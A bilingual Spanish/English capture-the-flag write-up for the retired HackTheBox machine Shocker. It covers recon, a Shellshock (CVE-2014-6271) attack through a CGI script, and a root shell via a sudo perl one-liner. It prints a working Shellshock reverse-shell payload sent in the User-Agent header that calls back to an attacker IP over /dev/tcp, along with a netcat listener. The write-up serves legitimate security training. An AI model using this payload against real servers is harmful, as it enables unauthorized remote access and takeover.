# Shocker [EASY]

> **ES:** Máquina Easy Linux vulnerable a Shellshock (CVE-2014-6271) vía script CGI; escalada con `sudo perl` (GTFOBins).
> **EN:** Easy Linux machine vulnerable to Shellshock (CVE-2014-6271) via CGI script; privesc with `sudo perl` (GTFOBins).

| Campo | Valor |
|-------|-------|
| **Dificultad / Difficulty** | Easy |
| **OS** | Linux (Ubuntu 16.04) |
| **Estado / Status** | Retired (30-sep-2017 → 17-feb-2018) |
| **Maker** | mrb3n |
| **URL** | https://app.hackthebox.com/machines/Shocker |

## 🎯 Objetivo / Objective

> **ES:** Obtener `user.txt` (shelly) y `root.txt` vía RCE Shellshock + `sudo perl`.
> **EN:** Get `user.txt` (shelly) and `root.txt` via Shellshock RCE + `sudo perl`.

## 🛠️ Herramientas / Tools

- `nmap` (incl. script `http-shellshock`), `feroxbuster`, `Burp Repeater`, `nc`

## 📝 Pasos / Steps

### 1. Reconocimiento / Recon

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.56
nmap -p 80,2222 -sCV -oA scans/nmap-tcpscripts 10.10.10.56
```

**Resultado / Result:** 80/tcp HTTP (Apache 2.4.18 Ubuntu) + 2222/tcp SSH (OpenSSH 7.2p2). Web mínima ("Don't Bug Me!").

### 2. Enumeración web: el detalle del `/` final / Web enum: the trailing-slash detail

> **ES:** El fuzzing estándar no halla nada; el `ScriptAlias /cgi-bin/` de Apache solo matchea CON slash final, así que hay que forzar `feroxbuster -f`. Ahí aparece `/cgi-bin/user.sh` (script bash de uptime).
> **EN:** Standard fuzzing finds nothing; Apache's `ScriptAlias /cgi-bin/` only matches WITH trailing slash, so force `feroxbuster -f`. That reveals `/cgi-bin/user.sh` (bash uptime script).

```bash
feroxbuster -u http://10.10.10.56 -f -n
feroxbuster -u http://10.10.10.56/cgi-bin/ -x sh,cgi,pl
```

**Resultado / Result:** `200 http://10.10.10.56/cgi-bin/user.sh`.

### 3. RCE Shellshock (CVE-2014-6271) / Shellshock RCE

> **ES:** El `User-Agent` llega a variable de entorno del CGI bash → inyección `() { :;};`. Comandos con ruta completa (`$PATH` vacío) y `echo;` primero para que la salida vuelva en el body (sin eso, HTTP 500).
> **EN:** `User-Agent` lands in the CGI bash environment → `() { :;};` injection. Full paths (`$PATH` empty) and leading `echo;` so output returns in the body (else HTTP 500).

```bash
# detección / detection
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
# → VULNERABLE (Exploitable), CVE-2014-6271

# shell (User-Agent en Burp Repeater / User-Agent in Burp Repeater)
() { :;}; /bin/bash -i >& /dev/tcp/<TU_IP>/443 0>&1
```

```bash
nc -lvnp 443
# shelly@Shocker:/usr/lib/cgi-bin$
python3 -c 'import pty;pty.spawn("bash")'
```

**Resultado / Result:** shell como `shelly` → `cat /home/shelly/user.txt` = `user.txt`.

### 4. Root: `sudo perl` / Root via `sudo perl`

```bash
sudo -l
# User shelly may run: (root) NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/bash"'
cat /root/root.txt
```

**Resultado / Result:** shell root → `root.txt`. (GTFOBins: `perl -e 'exec "/bin/bash"'`.)

## 🎓 Lo aprendido / Learned

> **ES:** `ScriptAlias` con/sin slash cambia el fuzzing (usar `-f`); Shellshock vive en headers→env de CGI; sin `echo;` inicial el output rompe headers (500); teoría 0xdf: tras el import de función solo corren builtins bash hasta el primer binario.
> **EN:** `ScriptAlias` with/without slash changes fuzzing (use `-f`); Shellshock lives in CGI headers→env; without leading `echo;` output breaks headers (500); 0xdf's theory: after function import only bash builtins run until the first binary.

## 📚 Fuentes / Sources

- [HTB: Shocker — 0xdf](https://0xdf.gitlab.io/2021/05/25/htb-shocker.html) — 0xdf — fecha de acceso: 2026-09-24 (paráfrasis; comandos verificados contra el original)
- [HackTheBox - Shocker (IppSec, video)](https://www.youtube.com/watch?v=IBlTdguhgfY) — IppSec
- Autor notas: Apuromafo

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de contenido activo.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish active content flags.

_Fecha de edición: 2026-09-24_
